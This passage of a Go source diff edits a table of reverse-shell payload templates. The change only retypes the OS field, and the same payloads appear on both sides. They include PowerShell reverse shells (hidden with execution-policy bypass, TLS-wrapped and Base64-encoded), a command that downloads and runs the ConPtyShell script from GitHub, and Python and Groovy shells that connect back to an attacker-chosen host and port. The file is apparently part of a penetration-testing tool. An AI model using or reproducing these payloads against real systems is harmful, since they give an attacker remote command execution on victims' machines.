$TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"},
-	{Name: "PowerShell #2", OS: []types.OperatingSystem{"Windows"}, ShellTpl: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{HOST}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""},
-	{Name: "PowerShell #3", OS: []types.OperatingSystem{"Windows"}, ShellTpl: "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{{HOST}}', {{PORT}});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\""},
-	{Name: "PowerShell #4 (TLS)", OS: []types.OperatingSystem{"Windows"}, ShellTpl: "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{{HOST}}', {{PORT}});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"},
-	{Name: "PowerShell #3 (Base64)", OS: []types.OperatingSystem{"Windows"}, ShellTpl: "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="},
-	{Name: "Python3 Windows", OS: []types.OperatingSystem{"Windows"}, ShellTpl: `
+	{Name: "Windows ConPty", OS: []string{"Windows"}, ShellTpl: "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{HOST}} {{PORT}}"},
+	{Name: "PowerShell #1", OS: []string{"Windows"}, ShellTpl: "$LHOST = \"{{HOST}}\"; $LPORT = {{PORT}}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"},
+	{Name: "PowerShell #2", OS: []string{"Windows"}, ShellTpl: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{{HOST}}',{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""},
+	{Name: "PowerShell #3", OS: []string{"Windows"}, ShellTpl: "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{{HOST}}', {{PORT}});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\""},
+	{Name: "PowerShell #4 (TLS)", OS: []string{"Windows"}, ShellTpl: "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{{HOST}}', {{PORT}});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"},
+	{Name: "PowerShell #3 (Base64)", OS: []string{"Windows"}, ShellTpl: "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4AMQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="},
+	{Name: "Python3 Windows", OS: []string{"Windows"}, ShellTpl: `
 	import os,socket,subprocess,threading;
 	def s2p(s, p):
 			while True:
@@ -926,5 +926,5 @@ var RevShells = []types.RevShell{
 	except KeyboardInterrupt:
 			s.close()
 	`},
-	{Name: "Groovy", OS: []types.OperatingSystem{"Windows"}, ShellTpl: "String host=\"{{HOST}}\";int port={{PORT}};String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"},
+	{Name: "Groovy", OS: []string{"Windows"}, ShellTpl: "String host=\"{{HOST}}\";int port={{PORT}};String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"},
 }
